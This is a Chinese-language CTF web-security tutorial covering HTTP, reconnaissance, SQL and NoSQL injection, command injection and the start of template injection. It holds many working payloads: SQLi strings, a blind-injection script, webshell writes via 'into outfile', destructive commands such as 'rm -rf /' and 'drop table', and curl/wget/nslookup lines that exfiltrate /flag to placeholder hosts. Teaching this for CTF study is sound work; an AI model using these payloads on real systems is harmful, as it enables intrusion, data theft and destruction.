基础知识储备

1. HTTP/HTTPS 协议

Web 题的本质是"和服务器聊天"，而聊天的语法就是 HTTP。抓包抓出来的每一个包，都能拆成这四块：

1GET /index.php?id=1 HTTP/1.1        ← 请求行：方法 + 路径 + 版本
2Host: www.example.com               ← 请求头：一堆键值对
3Cookie: PHPSESSID=abc123
4User-Agent: Mozilla/5.0 ...
5
6username=admin&pass=123             ← 请求体：POST 才带（GET 没有）

常用方法（别只会 GET/POST，冷门方法是常考点）：

方法 作用 CTF 里的用处
GET 获取资源，参数在 URL 最常见的传参方式
POST 提交数据，参数在请求体 上传、登录
HEAD 只要响应头，不要 body 不执行代码地探测文件是否存在、看响应头
PUT 上传/覆盖文件 遇到就试试写 webshell
OPTIONS 问服务器支持哪些方法 探测可用方法、CORS 预检
DELETE 删除资源 删除 .htaccess、删上传的黑名单校验文件
TRACE 回显请求内容 反射型 XSS 的载体
PATCH 局部更新 有些框架的路由只认它

小技巧：如果题目只校验 GET，试试换 POST 传参；反之亦然。很多题目的过滤只写在其中一个方法里。用 Burp 的话右键 → Change request method 一键切换。

必背的请求头（后面章节反复要用）：

请求头 含义 为什么重要
Host 目标域名 有些题的虚拟主机路由靠它分流，改它能打到内网站点
Cookie 会话凭证 注入点、越权、XSS 外带目标都在这里
User-Agent 客户端标识 SQL 注入点、可以被写进日志里 getshell、XSS 的注入点
Referer 来源页 CSRF 校验、SSRF 白名单校验、有的题拿它当"你是从哪来的"的判据
X-Forwarded-For 客户端真实 IP 限流绕过（改 IP 绕过"一天只能试三次"）、IP 伪造类题目
Content-Type 请求体格式 换成 application/xml 触发 XXE、改 MIME 绕过上传
Authorization 认证信息 JWT、Basic 认证
Origin 请求来源 CORS 校验

状态码（别只看 200，很多答案是藏在非 200 里的）：

状态码 含义 解题时的信号
200 成功 正常回显
301/302/308 永久/临时重定向 看 Location 头，可能泄露真实路径；SSRF 里用 302 跳转绕过白名单
400 请求格式错 你的 payload 把服务器整不会了，可能是有 WAF 或者要换编码
403 禁止访问 文件存在但没权限！这是最重要的信号，别一看 403 就跳过
404 不存在 但有时是 WAF 伪装的（真 404 和假 404 长度不一样）
405 方法不允许 说明路径存在，只是不许用这个方法，换个方法
500 服务器内部错误 报错注入的来源，也可能是 WAF 拦了导致代码崩了
502/504 网关错误/超时 CTF 里常是 SSRF 打内网或延时注入生效的证据

GET 与 POST 的核心区别：

维度 GET POST
参数位置 URL 查询串 请求体
长度限制 有（受浏览器/服务器限制） 理论上无
幂等性 是 否
CTF 技巧 参数会进日志、进 $_GET php://input 只能读 POST 的原始体

进阶：Content-Length 和 Transfer-Encoding: chunked 这两兄弟打架，就是 HTTP 请求走私（见第七章）。现在先记住它们存在。

2. Web 架构

一个请求的生命周期，大致是这样：

1浏览器(HTML/JS/CSS)
2      ↓  HTTP 请求
3中间件(Nginx/Apache/IIS)
4      ↓  反向代理 / 静态文件直出
5后端框架(PHP/Java/Python/Go)
6      ↓  路由 → 控制器 → 业务逻辑 → 数据访问
7数据库(MySQL/Redis/MongoDB)
8      ↑
9   渲染模板(Twig/Jinja2/Thymeleaf) → 返回 HTML

为什么这个流程要背下来？ 因为绝大多数 Web 漏洞，都是数据在某一层"跨界"了：

  • 用户输入进了 SQL 语句 → SQL 注入
  • 用户输入进了系统命令 → 命令执行
  • 用户输入进了模板 → SSTI
  • 用户输入进了反序列化数据 → 反序列化漏洞
  • 用户输入拼进了响应 HTML → XSS
  • 用户输入成了服务器要请求的 URL → SSRF

所以看到一个参数，你可以沿着这条链子挨个问一遍：“它接下来会去哪一层？”

MVC 模式：Model（数据）— View（展示）— Controller（调度）。CTF 里它的价值是帮你快速定位源码：路由在 routes/，业务在 Controllers/，SQL 在 Models/，模板在 views/。

API 与前后端分离：现代题目多是前后端分离的，后端只吐 JSON：

风格 形式 特点
RESTful GET /api/user/1 用 HTTP 方法表达操作，路径里有资源 ID（IDOR 越权的重灾区）
GraphQL POST /graphql + 查询语句 只有一个端点，用 introspection 泄露全部的接口结构和字段
JSON-RPC POST / + {"method":"..."} CTF 常见，注意参数名和 params 数组

小技巧：前后端分离的题，F12 → Network 里能看到所有接口。别急着抓包，先把接口清单列出来，往往有一个接口是"忘了鉴权"的。

Web工具

工具不是越多越好，而是要形成一套肌肉记忆：什么场景掏什么家伙。

1. 抓包与改包（核心中的核心）

工具 定位 关键功能
Burp Suite 抓包平台（正统） Proxy 抓包、Repeater 手改重放、Intruder 爆破、Decoder 编解码、Comparer 对比响应差异
Yakit 中文版 Burp 上手快，MITM + 插件生态，国内比赛很方便

必做配置：Burp 装上后先开 Proxy → Intercept is off，用 HTTP history 被动抓包，需要改的包右键 Send to Repeater。别一直开着拦截，不然你会被弹窗烦死。

2. 信息收集

5. AI 助手

现在的 AI（包括我自己在内0v0）在这几件事上非常好用：

  • 帮你想思路：把题目信息、源码、报错一股脑贴给它，让它列可能性。
  • 帮你写脚本：二分法盲注脚本、payload 生成器、正则绕过构造。
  • 帮你解释源码：看不懂的 PHP/Java 逻辑，直接丢过去让它翻译成中文。
  • 帮你做变形：一个 payload 被拦了，让它生成 10 种变体。

但注意：AI 会一本正经地胡说（尤其是"这个函数在 PHP 8 里还能用"这种），payload 必须自己动手打一遍验证。AI 给的是可能性，不是答案。

第二章：信息收集 (Information Gathering)

Web 题的第一步永远是把题目"看光"。很多时候 flag 不用打漏洞，你扫目录就扫出来了。这一章的思路就一句：凡是服务器愿意给你的东西，都先要到手。

敏感文件泄露

核心逻辑：开发/运维在部署时留下的"方便"，都是攻击者的"入口"。

1. 管理类文件

1.1 robots.txt

  • 作用：搜索引擎爬虫协议文件，告诉爬虫哪些路径不应抓取。

  • 渗透思路：黑名单信息含涉密路径、后门、管理后台、备份等，非常容易疏忽泄露。

  • 例子：

    1Disallow: /admin
2Disallow: /hidden/flag.txt
1.2 sitemap.xml
  • 作用：网站内容地图，列出所有可爬网址。
  • 渗透思路：直接暴露未公开子目录，配合robots.txt查询价值极高。
1.3 .env
  • 作用：各类Web框架常用环境变量文件。
  • 渗透：很多JWT密钥、数据库连接信息、邮箱API等一览无遗，PHP、Laravel、Node.js尤其常见。
1.4 其它"部署痕迹"
文件 内容 价值
Dockerfile / docker-compose.yml 镜像构建过程 直接把题目环境、启动命令、flag 路径交代清楚
README.md / CHANGELOG.md 项目说明、更新日志 暴露框架版本 → 找对应 CVE
.ssh/id_rsa、.bash_history 私钥、命令历史 私钥直接登服务器，历史记录里常有数据库密码
crossdomain.xml Flash 跨域策略 配成 * 就是任意域可读，老题的经典考点
WEB-INF/web.xml Java Web 配置 泄露 Servlet 映射、classes 目录位置
.htaccess Apache 目录配置 看得懂它就知道什么文件能执行
phpinfo.php、info.php phpinfo() 输出 见本章「配置泄露」一节
.well-known/ 各种规范约定的目录 security.txt、change-password 之类

2. 源码和仓库泄露

2.1 .git/
  • 作用：Git版本库目录。
  • 渗透：若未做严格防护可直接遍历和还原完整源码。使用 GitHack.py、githound等工具，一键还原全部源码+敏感信息。

手工验证是否泄露：直接访问 /.git/HEAD，如果返回 ref: refs/heads/master，恭喜，整个仓库都是你的。

避坑：如果目录扫描只扫到 /.git/index 扫不到别的，试试 CurlyWget/git-dumper 这类"按需下载"的工具——有些站只允许访问 .git/index、.git/logs/HEAD 这几个文件，靠它也能推出完整源码。

2.2 .svn/、.hg/
  • 作用：分别对应Subversion、Mercurial代码管理目录。
  • 渗透：同理可还原源代码及全部提交历史。
2.3 .DS_Store
  • 作用：Mac下目录索引文件。
  • 渗透：泄露完整目录结构（可见文件名），辅助发现"隐藏文件"“Flag”。
  • 工具：ds_store_exp 可以把里面的文件列表解出来。
2.4 www.zip、code.tar.gz、source.bak
  • 作用：习惯性手工备份或源码打包，上传或备份遗留。
  • 渗透：敏感备份/打包文件常规文件： www.zip、web.zip、backup.zip、site.bak、index.php.bak、src.rar、bak.tar.gz等
2.5 源码泄露的进阶玩法

拿到源码以后别急着一头扎进去读，按这个顺序看，性价比最高：

  1. 先看 flag 在哪：grep -r "flag" .，看它是文件读进来的、还是环境变量、还是数据库里查出来的——这直接决定你要拿哪种漏洞。
  2. 再看入口与路由：有哪些页面是你之前没扫出来的？哪些参数没做过滤？
  3. 然后看过滤：preg_match、str_replace、blacklist 这些关键词，把"出题人怕什么"看明白。过滤函数就是考点地图。
  4. 最后看版本：composer.json、package.json、pom.xml 里的依赖版本，拿去查 CVE。

3. 编辑器临时/自动备份文件

3.1 Vim/Emacs交换备份
  • .swp/.swo
  • 例：index.php.swp
  • 用途与危害：Vim自动生成的内存交换文件。利用strings等命令可恢复大量源码或明文密码。

用法：vim -r index.php.swp 能直接把内容恢复出来；没装 vim 就用 strings index.php.swp | head -50 肉眼看，一般也能看出个大概。

3.2 Emacs临时文件
  • 例：index.php~, #index.php#
3.3 其它常见临时/备份扩展
  • .bak、.old、.backup、.save、.tmp、.temp
  • 典型案例：index.php.bak、config.php.old，甚至flag.php.save

组合拳：目录扫描时把后缀字典换成 {php,bak,swp,old,txt,zip} 这一组，命中率远高于只扫目录名。同理，“文件名爆破"和"目录爆破"要分两轮跑。

4. 常见渗透/CTF技巧总结

  1. 爆破路径字典：用字典工具快速遍历敏感路径 典例：dirsearch, ffuf, gobuster
  2. 尝试访问源码与备份文件：如index.php.bak，几乎等同于源码泄露。
  3. 下载解压源码包或查看仓库提交历史：发现历史密码、后台路径、flag等。
  4. 扫描.git, .svn, .hg：直接还原项目全部文件、操作commit，甚至逆推出未上线flag。
  5. 编辑器遗留文件源码复原：如vim .swp 文件，用strings或专用工具还原内容，常获flag。
  6. 看提交历史里的"删掉的东西”：git log -p 逐条翻，出题人删掉的 flag 格式、被注释掉的过滤逻辑，都在里面。

一句话速查：

  • 源码泄露：www.zip、.git、.svn、.hg、.DS_Store。
  • 备份文件：index.php.bak、vim 交换文件 (.swp)。

目录扫描 (Directory Scanning)

扫目录是信息收集里最"笨"也最"有效"的一环。要点不在工具，在你怎么解读扫描结果。

1. 字典的选择

字典来源 说明
SecLists/Discovery/Web-Content/ 最全的集合，common.txt 起步，raft-* 系列更狠
dirsearch 自带字典 够用，配 -e php,html,js,zip,bak 指定后缀
针对题目定制 看到题目是 PHP 就 -e php，看到有上传功能就加 upload/、uploads/

2. 结果怎么读（重点）

现象 含义 下一步
200 + 一大坨内容 真命中 直接看内容
403 文件存在但没权限 换 HEAD 请求、换大小写、加斜杠、试 /.、试 %2e 绕过
301/302 目录跳转 看 Location，很可能进入一个新目录
200 但内容都一样 “假 200”（软 404） 对比 Content-Length 才能分辨，工具要设好过滤规则
500 路径存在但代码崩了 可能是 WAF 或者缺参数，加参数再试
长度忽大忽小 大概率是参数注入点 抓包看参数

CTF 小技巧：用 ffuf 的 -fs（过滤响应大小）和 -mc all（匹配所有状态码）组合，能一眼看出哪些响应"和别人不一样"。不一样的那个就是答案。

3. 别忘了这些位置

  • 参数级爆破：?id=1 里的 1 换成 flag、admin、source（源码泄露类题目最常在这种地方藏 ?source=1）。
  • 常见隐藏路径：/admin、/api、/source、/flag、/upload、/backup、/download、/debug、/console、/actuator。
  • 大小写与斜杠变体：/Admin、/ADMIN/、//admin、/admin/.。

指纹识别 (Fingerprinting)

知道对面用什么技术栈，等于知道该翻哪本手册。

  1. 操作系统：Linux / Windows。看路径写法（/var/www vs C:\inetpub）、看命令回显（id vs whoami）。
  2. 中间件：Apache / Nginx / IIS / Tomcat / Jetty。看响应头 Server、看报错页样式、看默认页。
  3. 语言与框架：看 Cookie 名（PHPSESSID → PHP、JSESSIONID → Java、connect.sid → Node），看报错信息的格式（Laravel 的报错页非常明显）。
  4. 数据库：看报错信息、看注入时函数是否可用（sleep() 能过就是 MySQL 系）。
  5. CMS 识别：WordPress（/wp-login.php）、Discuz（/forum.php）、Typecho、PHPCMS、DedeCMS。认出来以后直接去搜该版本的历史漏洞，比自己审源码快得多。
工具 看什么
Wappalyzer（浏览器插件） 一站式指纹
WhatWeb 命令行批量指纹
nmap -sV -sC 端口 + 服务版本
响应头 X-Powered-By、Server、Set-Cookie 最直接的指纹来源

小技巧：故意发一个会报错的请求（比如 ?id='），报错页的格式本身就是指纹。ThinkPHP 的"页面错误"页、Spring Boot 的 Whitelabel Error Page，截图都不用就能认出来。

配置泄露与 phpinfo

如果题目给了 phpinfo() 页面或者源码泄露了配置，重点只看这几项：

配置项 为什么要看
disable_functions 决定 RCE 后能不能直接 system，是绕过章节的起点
open_basedir 限制能读的目录范围，决定 flag 能不能直接 file_get_contents
allow_url_include 为 On 时 php://input、data:// 才能用于文件包含
allow_url_fopen 为 On 时才能包含远程文件（RFI）、才能 SSRF 读远程
Loaded Extensions 有没有 expect、soap、imagick、ffi——这些都是 getshell 的后门
DOCUMENT_ROOT flag 常摆在这附近
session.save_path 会话文件泄露题目要用的路径
upload_max_filesize / post_max_size 上传题的体格上限

其他信息源

  • 旁站：同一台服务器上的其他站点，可能防护更松。扫同 IP 的 80/443 上的其他域名。
  • 子域名：admin.example.com、test.example.com 常常是"没有防护的内部系统"。
  • 前端 JS：F12 → Sources 里的 JS 是最容易被忽视的信息源——接口地址、参数名、隐藏的 debug 开关、被注释掉的逻辑，全在里面。
  • 社工与 OSINT：题目给了人名/邮箱/公司名时，去搜一遍（GitHub 搜源码、whois 查域名注册信息）。
  • HTTP 响应头细节：X-Powered-By、Set-Cookie 里的 HttpOnly/SameSite、Access-Control-Allow-Origin（CORS 配错的直接证据）。

本章一句话总结：先扫（目录/端口/子域名）→ 再识别（指纹/框架版本）→ 再拿源码（备份/仓库泄露）→ 最后看配置（phpinfo/.env）。这四步走完，一半题目已经出答案了。

第三章：核心漏洞 - 注入篇 (Injection Attacks)

注入是 CTF Web 的半壁江山。所谓"注入"，本质只有一句话：用户的输入被当成了代码/指令的一部分来解析。

这一章按"输入进入哪一层"来分：进数据库是 SQL 注入，进系统 Shell 是命令执行，进语言解释器是代码执行，进模板引擎是 SSTI。

SQL 注入 (SQLi)

  • 基础：Union 注入, Boolean 盲注, Time 盲注。

  • 进阶：报错注入, 堆叠注入 (Stacked Queries)。

  • 技巧：WAF 绕过 (空格变体、编码绕过), NoSQL 注入 (MongoDB)。

在CTF中遇到SQL注入，先问自己三个问题：

  1. 注入点在哪？（确定注入点：GET/POST/Cookie/User-Agent）
  2. 数据库在干嘛？（判断类型：数字型/字符型/JSON型） 3. 结果怎么看？（决定手法：有回显用Union，无回显用盲注）

补充第四问：有没有被拦？ 如果报错是"检测到非法字符"而不是数据库报错，那就是 WAF，直接翻到本节的「技巧部分」，别在 payload 上瞎试。

1. 基础部分

Union 注入

适用场景：页面有明确的数据回显位置（如表格、用户名列表）。注意字段数对齐 核心步骤：

  1. order by n 猜列数（直到报错或页面异常）。
  2. union select 1,2,3... 查看回显位（哪个数字出现在页面关键位置）。
  3. 在回显位替换为 database() / group_concat(table_name)。

完整的手工流程长这样（假设是字符型、单引号闭合）：

 1-- 1. 判断闭合方式与列数
 2?id=1' order by 3 -- -        -- 正常，说明至少 3 列
 3?id=1' order by 4 -- -        -- 报错，说明是 3 列
 4
 5-- 2. 找回显位
 6?id=-1' union select 1,2,3 -- -     -- 用 -1 让前面的查询为空，2、3 出现在页面上
 7
 8-- 3. 拿数据（一步步往外爬）
 9?id=-1' union select 1,database(),3 -- -
10?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- -
11?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' -- -
12?id=-1' union select 1,group_concat(flag),3 from flag -- -
  • CTF小技巧：如果 union 被拦截，尝试 union all 或 union distinct；如果回显位显示不正常，检查是否是显错位在图片或二进制流中（需要hex编码）。
  • CTF小技巧：group_concat() 默认有长度上限（group_concat_max_len，常是 1024），数据被截断时用 substr 分段，或者 limit 0,1 一行一行取。
  • 避坑：末尾的注释符要按数据库选，-- -（MySQL 要求横杠后有个空格）、#、/* */。传参时 # 会被 URL 当锚点，记得编码成 %23。
Boolean 盲注

适用场景：页面不显示数据，但会根据SQL真假返回"成功/失败"或"存在/不存在"的不同页面。 核心逻辑：and ascii(substr(database(),1,1)) > 100 —— 页面正常则继续，异常则调整ASCII码。

 1# 二分法盲注脚本的骨架（改一下 url 和判断条件就能用）
 2import requests
 3
 4url = "http://target/index.php?id=1' and {} -- -"
 5def check(cond):
 6    r = requests.get(url.format(cond))
 7    return "You are in" in r.text      # 换成题目里"成功"的特征
 8
 9def get_char(pos):
10    lo, hi = 32, 127
11    while lo < hi:
12        mid = (lo + hi) // 2
13        if check(f"ascii(substr(database(),{pos},1))>{mid}"):
14            lo = mid + 1        # 大于 mid，往右找
15        else:
16            hi = mid
17    return chr(lo)
18
19print("".join(get_char(i) for i in range(1, 20)))
  • CTF小技巧：写脚本时注意二分法（50, 75, 88…）可以大幅减少请求次数；如果页面差异不明显，注意比较响应包长度(Content-Length)或状态码，不要肉眼看。
  • CTF小技巧：二分法把每字符的请求数从 ~95 次降到 ~7 次，一次盲注从 10 分钟变 1 分钟。
  • 避坑：如果"真/假"页面长度只差几个字节，一定用 len(r.text) 判断，肉眼看一定会翻车。
Time 盲注

适用场景：页面完全无回显，也没有布尔状态变化（比如插入日志、报错被全局吞掉）。页面永远不变，只有响应时间变。 核心逻辑：and if(ascii(substr(database(),1,1))>100, sleep(5), 0)

  • CTF小技巧：延时不要设5秒，设1秒或2秒即可，配合benchmark(10000000,md5('a'))有时更稳定；写多线程脚本时注意超时时间设置比延时稍长。
  • 避坑：如果 sleep 被过滤，换 benchmark(5000000,md5(1))、rpad()、笛卡尔积（select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c）也可以造延时。
  • 避坑：服务器负载高的时候，延时可能被"网络抖动"吃掉。正规做法是每个判断跑 2~3 次取平均，或者把延时设大一点。

2. 进阶部分

报错注入

适用场景：页面开启了数据库错误回显（Error-based），但union被限制或不支持。 常用Payload：

  • updatexml(1, concat(0x7e, user(), 0x7e), 1) —— MySQL 5.1+
  • extractvalue(1, concat(0x7e, version()))

CTF避坑：报错注入有长度限制（最长32位），大量数据请配合substr分段截取，或改用group_concat先聚合再分段。

更多的报错函数（按"哪个没被过滤就用哪个"来选）：

函数 Payload 骨架 备注
updatexml() and updatexml(1,concat(0x7e,(select database()),0x7e),1) 最常用
extractvalue() and extractvalue(1,concat(0x7e,(select database()))) 最常用
floor() and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) 长但是能回显更多
exp() and exp(~(select * from(select database())a)) MySQL 5.5+
geometrycollection() and geometrycollection((select * from(select database())a)) 少见但好用
GTID_SUBSET() and GTID_SUBSET(concat(0x7e,(select database()),0x7e),1) 新版本 MySQL 可用

避坑：updatexml 和 extractvalue 在 MySQL 8.0 之后被移除了，打新版本靶机要换 floor() 或 GTID_SUBSET()。

堆叠注入 (Stacked Queries)

适用场景：mysqli_multi_query() 或 PDO 允许多语句执行（CTF中常见于强网杯、HCTF）。 CTF核心玩法：它不用于查数据，而是用于改数据或写文件。

  • ; drop table flag -- - （破坏性，慎用）

  • ; set @sql=...; prepare ...; execute ...; （预编译绕过过滤）

  • ; select '<?php eval($_POST[1])?>' into outfile '/var/www/shell.php' （需知路径）

  • 关键提示：堆叠注入在CTF中90%用于getshell或UDF提权，而不是查表内容。

常用堆叠玩法一览：

玩法 Payload 前提条件
写文件 getshell ; select '<?php eval($_POST[1]);?>' into outfile '/var/www/html/s.php' 有 FILE 权限 + 知道可写路径 + secure_file_priv 为空
预编译绕过 ;set @s=0x73656c656374...;prepare e from @s;execute e; 多语句 + 关键字被过滤时把 SQL 写成十六进制
改数据（打逻辑题） ;update users set role='admin' where username='me' 想"合法登录"进去看后台
建表回显 ;create table x(y varchar(100));insert into x select database(); 页面只查某张固定表时
写定时任务/计划任务 ;select '...' into dumpfile '/var/spool/cron/root' 有权限，实战向

避坑：into outfile 写入的内容里不能有反引号和单引号冲突，<?php eval($_POST[1]); 里的引号容易把 SQL 语句搞崩。稳妥写法是把 shell 内容 hex 编码：;select 0x3c3f706870... into outfile '/var/www/html/s.php'。

3. 技巧部分（重点写"WAF绕过的底层逻辑"）

底层逻辑：WAF 无非是"正则匹配 + 字符串替换"两种手段。所以绕过只有三个方向：让正则匹配不到（编码、变形）、让替换后还能用（双写、注释）、利用解析差异（HTTP 层、数据库层对同一串的理解不同）。

WAF 绕过（空格变体、编码绕过）
  1. 空格绕过（当空格被过滤）：
    • /**/ （内联注释）
    • %0a （换行）、%0c （换页）
    • 括号() 包裹：select(id)from(users)
    • +（URL 里的加号会被解成空格）、%09（Tab）、%0b（垂直制表符）
  2. 关键字绕过（当select/union被过滤）：
    • 大小写：SeLeCt
    • 内联注释：/*!50000union*/
    • 双写：ununionion （针对替换为空的情况）
    • 等价替换：union → union all；and → && 或 %26%26；or → ||；= → like／regexp／between／in
    • information_schema 被过滤 → 用 mysql.innodb_table_stats、sys.schema_table_statistics 甚至无列名注入
  3. 编码绕过（当WAF做正则匹配时）：
    • URL双重编码：%2527
    • Unicode：%EF%BC%87 （全角引号，部分数据库支持）
    • Hex编码：0x61646d696e 替代 'admin'
    • URL编码：%73%65%6c%65%63%74 就是 select
  4. HTTP 层绕过（WAF 看的是 HTTP，不一定是数据库看的那份）：
    • 分块传输：Transfer-Encoding: chunked 把 payload 切成块，很多 WAF 拼不回来
    • 参数污染（HPP）：?id=1&id=payload，PHP 取最后一个、WAF 查第一个
    • Content-Type 变形：application/x-www-form-urlencoded 换成 multipart/form-data，WAF 可能就不解析了

无列名注入（information_schema 被整表过滤时）：不用查列名，直接按位置取数据。

1select 1,2,3 from (select 1,2,3 union select * from flag)a
2-- 或者用别名定位
3select group_concat(b) from (select 1,2 as b,3 union select * from flag)x
万能密码与登录绕过

最经典的考点，其实就是注入给登录逻辑"改条件"：

 1-- 1. 最原始
 2' or 1=1 -- -
 3admin' -- -
 4admin' #            -- 注意 # 在 URL 里要编码成 %23
 5
 6-- 2. 空格/注释被过滤时
 7'||1=1||'
 8'/**/or/**/1=1/**/--/**/-
 9
10-- 3. 不知道用户名时，用 select 判断
11' or (select substr(flag,1,1) from flag)='f' -- -

避坑：很多题目会检查"or 前后的空格"，或者干脆 str_replace("or","")。这时用 '||'、%26%26（&&）、an/**/d 变形。

NoSQL 注入 (MongoDB)

NoSQL的语法和SQL完全不一样。这里用大多数情况下的MongoDB举例

对比维度 SQL注入 (SQLi) NoSQL注入 (MongoDB)
目标数据库 关系型（MySQL/Oracle等） 非关系型（MongoDB等）
注入语法 拼接 SELECT、UNION、OR 1=1 注入 $ne、$gt、$where、数组语法
攻击载体 字符串拼接 JSON结构或操作符污染
利用难度 工具成熟（sqlmap） 需手工构造，无统一自动化工具
典型后果 数据泄露、写Shell、提权 数据泄露、绕过认证、执行JS（若启用）

什么是关系型和非关系型呢？

维度 关系型（MySQL） 非关系型（MongoDB）
存储逻辑 像Excel多个工作表，用公式（外键）串起来 像Word文档，把一件事从头到尾写在一个段落里
数据一致性 强一致。改地址只改一处，全局生效 可能有冗余。如果每个订单文档都单独存地址，改地址要改N处
查询方式 多表联查（JOIN）：用户表 JOIN 订单表 ON... 查一个文档就拿到所有信息，无需联查
适合场景 金融、ERP、账务（钱和数字绝对不能乱，必须强约束） 社交动态、商品详情页、日志（数据结构多变，允许偶尔不一致）

关系型（SQL）：信奉 “数据完整性至上”。设计数据库先画ER图（实体关系图），把复杂的数据拆成最小原子，用"关系"约束它们。优点是精准、节省空间，缺点是慢（因为查个数据可能要关联5张表）。

非关系型（NoSQL）：信奉 “开发效率至上”。互联网时代数据格式千变万化（比如今天加个标签，明天加个评论），每次都去改表结构太痛苦。不如直接把整个对象存成JSON，用空间换时间，查询极快（因为一次就读出来了），缺点是有数据冗余。

CTF中的NoSQL注入 常出现在Node.js或PHP的MongoDB环境中。 核心差异：不再是' or 1=1 --，而是破坏JSON结构。 经典Payload：

  • 参数传：username[$ne]=null&password[$ne]=null （$ne 不等于，绕过登录）
  • 传JSON体：{"username": {"$regex": "^admin"}} （正则盲注）

CTF技巧：注意$where函数，如果题目允许JavaScript执行，可以用$where: "function(){return this.username=='admin' && sleep(10000)}"进行时间盲注。

MongoDB 常用操作符与玩法：

操作符 含义 攻击用法
$ne 不等于 {"password":{"$ne":"x"}} 拿任意密码登录
$gt / $lt 大于/小于 {"password":{"$gt":""}} 绕过登录
$regex 正则匹配 盲注炸字符：{"username":{"$regex":"^a"}} 一点点试
$where JS 表达式 {"$where":"this.username=='admin'"}，能执行 JS 时可做时间盲注
$exists 字段是否存在 猜字段名
$in 在集合内 配合数组传参

避坑：PHP 里 username[$ne]=null 这个写法之所以能用，是因为 PHP 会把 $_GET['username'] 解析成数组，从而在拼 JSON 时变成了一个"查询对象"。这也是为什么用 $_POST 直接拼字符串的代码反而不容易中招。

正则盲注的提速：不要一次猜一个字符，用 ^a、^b…… 逐个试；更快的做法是判断"字符范围"，或者直接上 [a-z] 类字符集缩小范围。

命令执行 (RCE/Command Injection)

1.原理

开发者把用户输入直接当作系统命令的一部分去执行时，就会导致命令执行。

典型错误代码（PHP）：

1$ip = $_GET['ip'];
2system("ping -c 4 " . $ip);  // 开发者想实现ping功能

如果用户传入 8.8.8.8; rm -rf /，最终执行的命令就是：

1ping -c 4 8.8.8.8; rm -rf /

分号 ; 让系统执行完ping后，顺手执行了删库命令。

操作命令符详解

符号 名称 执行逻辑 典型Payload 利用场景
; 顺序执行 不管前面成功失败，后面照跑 ping 127.0.0.1; whoami 最通用，无脑首选
& 后台执行 前面命令放后台运行，立即执行后面 ping 127.0.0.1 & whoami 不在乎前面输出，只管注入
&& 逻辑与 前面成功(返回0)才执行后面 ping 127.0.0.1 && whoami 避免报错暴露，更隐蔽
| 管道符 前面输出作为后面的输入 cat /flag | base64 数据处理（编码/过滤）
|| 逻辑或 前面失败(返回非0)才执行后面 ping xxx || whoami 前面命令不存在时触发

小技巧：%0a（换行）也是命令分隔符，而且很多 WAF 只防 ; 不防换行。同理 %0d。

小技巧：$() 和反引号是命令替换，属于"在一条命令内部再执行一条命令"，常用于 echo $(cat /flag) 这种"外面看起来没分号"的场景。cat$(ls) 也是利用这一招来规避空格过滤。

2.常见触发函数

PHP

  • system()、exec()、shell_exec()（无反引号）
  • passthru()、popen()、proc_open()
  • 反引号：ls 等价于 shell_exec()
  • eval()（严格来说是代码执行，但经常和命令执行混用）

Python

  • os.system()、os.popen()、subprocess.Popen()、subprocess.call()

Java

  • Runtime.getRuntime().exec()、ProcessBuilder

Node.js

  • child_process.exec()、child_process.spawn()

看到参数直接拼在函数名后面，可试探：

1?cmd=id
2?ip=127.0.0.1;whoami
3?file=test.txt|ls

当页面回显指令执行结果时，利用：

 1# 查看当前用户
 2?cmd=whoami
 3# 查看当前目录
 4?cmd=ls
 5# 直接读flag
 6?cmd=cat /flag
 7?cmd=cat flag.php
 8?cmd=tac flag.php      # tac是cat的反向输出
 9?cmd=more flag.php
10?cmd=less flag.php
11?cmd=head flag.php
12?cmd=tail flag.php
13...
14#cat被过滤时找其他方法读取flag

“先定位，再读取”：真实题目里 flag 往往不在当前目录。养成习惯先 ls /、find / -name "*flag*"、ls -la /，再决定读哪个文件。

1?cmd=ls /
2?cmd=ls -la /var/www/html
3?cmd=find / -name "*flag*" 2>/dev/null
4?cmd=cat /flag.txt
5?cmd=env        # flag 有时藏在环境变量里

3.无回显 RCE

命令执行了，但页面一片空白或只返回固定内容（如 ping 输出被丢弃）。

DNS外带

利用 dig 或 nslookup 将数据带出：

1# Linux
2?cmd=nslookup $(whoami).your-dnslog.cn
3?cmd=dig $(cat /flag | base64).your-dnslog.cn
4
5# Windows（CTF较少见）
6?cmd=ping %USERNAME%.your-dnslog.cn
HTTP外带
1?cmd=curl http://your-server.com/$(whoami)
2?cmd=wget http://your-server.com/$(cat /flag | base64)

避坑：外带的数据要先 base64 再拼进域名。因为域名不允许 /、空格、换行这类字符，flag 里一旦有它们，查询就直接失败了。

避坑二：DNS 域名总长有限制（单个标签 63 字节），flag 长了要分段外带：

1?cmd=curl http://your-server.com/$(cat /flag | base64 | head -c 50)

避坑三：外带失败先确认能不能出网。很多靶机只允许 DNS 出网，那就老老实实用 DNSLog（dnslog.cn、ceye.io、Burp Collaborator）。

模板注入 (SSTI)

一句话原理：模板引擎把 {{ }} / ${ } 里的内容当代码求值，如果用户输入拼进了模板字符串，就等于把代码执行权限递给了攻击者。

典型错误代码：

1# 危险！用户输入直接拼进模板字符串
2render_template_string("Hello " + name)
3# 安全写法：把用户输入作为"数据"传进去
4render_template_string("Hello {{ name }}", name=name)

1. 怎么判断有没有 SSTI（识别三步）

第一步：找反射点。 任何"你输入什么，它就原样显示什么"的地方都值得试：搜索框、用户名回显、报错信息、URL 参数回显。

第二步：打数学表达式。 输入 {{7*7}}，如果页面显示 49，那这个位置就在求值，不是单纯的回显。

第三步：用表达式区分引擎。 不同引擎的语法不一样，一测就露馅：

Payload 返回结果 说明
{{7*7}} 49 Jinja2 / Twig / Nunjucks / Django（Django 不支持运算，会原样输出）
{{7*'7'}} 7777777 Jinja2（Python 里字符串乘整数）
{{7*'7'}} 49 Twig（PHP 会把 '7' 转成数字）
${7*7} 49 FreeMarker / Thymeleaf / Spring EL
#{7*7} 49 Ruby ERB / Thymeleaf
<%= 7*7 %> 49 EJS / ERB / Rails
{7*7} 49 Smarty
${{7*7}} 49 Velocity（部分版本）
%{7*7} 49 Mako（早期版本）

小技巧：{{7*'7'}} 是区分 Jinja2 和 Twig 的关键一题。看到 7777777 是 Python，看到 49 是 PHP。

小技巧：如果 {{7*7}} 没反应，试试 {{7*7}} 前面加空格、或者 ${{{7*7}}}、{% raw %} 之类，有的模板只是"转义"了而不是"不求值”。

2. Jinja2（Python / Flask）——最常考

